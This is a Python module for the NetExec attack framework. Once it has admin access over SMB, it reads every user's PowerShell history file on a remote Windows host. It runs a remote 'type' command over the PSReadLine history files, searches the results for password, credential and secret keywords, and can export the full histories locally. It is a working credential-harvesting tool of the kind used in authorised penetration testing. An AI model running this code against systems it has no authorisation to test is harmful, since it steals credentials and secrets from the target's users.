import traceback
from os import makedirs
from os.path import join, abspath
from nxc.paths import NXC_PATH


class NXCModule:
    """Module by @357384n"""

    name = "powershell_history"
    description = "Extracts PowerShell history for all users and looks for sensitive commands."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """To export all the history you can add the following option: -o export=True"""
        context.log.info(f"Received module options: {module_options}")
        self.export = bool(module_options.get("EXPORT", False))
        context.log.info(f"Option export set to: {self.export}")

    def analyze_history(self, history):
        """Analyze PowerShell history for sensitive information."""
        sensitive_keywords = [
            "password", "passwd", "passw", "secret", "credential", "key",
            "get-credential", "convertto-securestring", "set-localuser",
            "new-localuser", "set-adaccountpassword", "new-object system.net.webclient",
            "invoke-webrequest", "invoke-restmethod"
        ]
        sensitive_commands = []
        for command in history:
            command_lower = command.lower()
            if any(keyword.lower() in command_lower for keyword in sensitive_keywords):
                sensitive_commands.append(command.strip())
        return sensitive_commands

    def on_admin_login(self, context, connection):
        """Main function to retrieve and analyze PowerShell history."""
        try:
            context.log.info("Retrieving PowerShell history...")
            command = 'powershell.exe "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"'
            history = connection.execute(command, True).split("\n")
            if history:
                sensitive_commands = self.analyze_history(history)
                if sensitive_commands:
                    context.log.highlight("Sensitive commands found in PowerShell history:")
                    for command in sensitive_commands:
                        context.log.highlight(f"  {command}")
                else:
                    context.log.info("No sensitive commands found in PowerShell history.")
            else:
                context.log.info("No PowerShell history found.")

            # Check if export is enabled
            context.log.info(f"Export option is set to: {self.export}")
            if self.export and history:
                host = connection.host  # Assuming 'host' contains the target IP or hostname
                filename = f"{host}_powershell_history.txt"
                export_path = join(NXC_PATH, "modules", "powershell_history")
                path = abspath(join(export_path, filename))
                makedirs(export_path, exist_ok=True)

                context.log.info(f"Export enabled, writing history to {path}")
                try:
                    with open(path, "w") as file:
                        for cmd in history:
                            file.write(cmd + "\n")
                    context.log.highlight(f"PowerShell history written to: {path}")
                except Exception as e:
                    context.log.fail(f"Failed to write history to {filename}: {e}")
        except Exception as e:
            context.log.fail(f"UNEXPECTED ERROR: {e}")
            context.log.debug(traceback.format_exc())
